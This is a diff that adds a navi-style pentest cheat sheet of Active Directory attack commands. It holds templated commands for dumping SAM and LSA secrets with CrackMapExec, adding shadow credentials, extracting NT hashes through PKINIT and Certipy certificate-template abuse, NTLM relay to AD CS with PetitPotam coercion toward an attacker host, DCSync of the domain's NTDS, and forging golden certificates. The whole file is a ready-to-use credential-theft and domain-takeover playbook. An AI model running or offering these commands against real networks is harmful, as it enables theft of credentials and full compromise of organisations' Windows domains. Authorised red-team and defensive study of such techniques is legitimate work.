@@ -1,0 +1,51 @@
+% crackmapexec,cme,smb,sam,lsa,recon
+
+# CME: Dump SAM file (local users only)
+cme smb <target> -u <user> -p <password> --sam
+
+# CME: Dump LSA secrets (includes Domain Cached Credentials)
+cme smb <target> -u <user> -p <password> --lsa
+
+% certipy,adcs,shadowcredentials,pkinit,ntlmrelay,petitpotam,certificates,privesc,ldap
+
+# Recon with Certipy
+certipy find <domain>/<user>:<password>@<domain> -enabled
+
+# Add shadow credentials (pywhisker)
+python3 /opt/pywhisker/pywhisker.py -u <user> -p <password> -d <domain> -t <target> --dc-ip <dc_ip> --action add
+
+# Get TGT with certificate (PKINITtools)
+python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx <cert.pfx> -pfx-pass <pfx_password> -dc-ip <dc_ip> <domain>/<target> <output_file>.ccache
+
+# Set Impacket ccache environment variable
+export KRB5CCNAME=<output_file>.ccache
+
+# Extract NT hash from TGT
+python3 /opt/PKINITtools/getnthash.py <domain>/<target> -key <key> -dc-ip <dc_ip>
+
+# Privesc via misconfigured cert templates: request cert
+certipy req <domain>/<user>:<password>@<ca_fqdn> -ca <ca_name> -template <template_name> -alt <target_user>@<domain> -out <outfile_prefix>
+
+# Authenticate and extract NT hash with cert
+certipy auth -pfx <outfile_prefix>.pfx -username <target_user> -domain <domain> -dc-ip <dc_ip>
+
+# NTLM Relay to AD CS HTTP endpoints: start relay
+certipy relay -ca <ca_ip> -template <template_name>
+
+# Coerce authentication (PetitPotam)
+python3 /opt/PetitPotam/PetitPotam.py -d <domain> <attacker_ip> <target_dc_ip>
+
+# Auth with certificate
+certipy auth -pfx <cert_file>.pfx -dc-ip <dc_ip>
+
+# DCSync after relay
+cme smb <target_dc>.<domain> -u <dc_machine_account> -H <nt_hash> --ntds
+
+# Add rogue CA to NTAuthCertificates (Windows)
+certutil.exe -dspublish -f <cert_file>.crt NTAuthCA
+
+# Golden certificates: backup CA
+certipy ca -backup -ca <ca_name>
+
+# Golden certificates: forge certificate
+certipy forge -ca-pfx <ca_backup>.pfx <options>
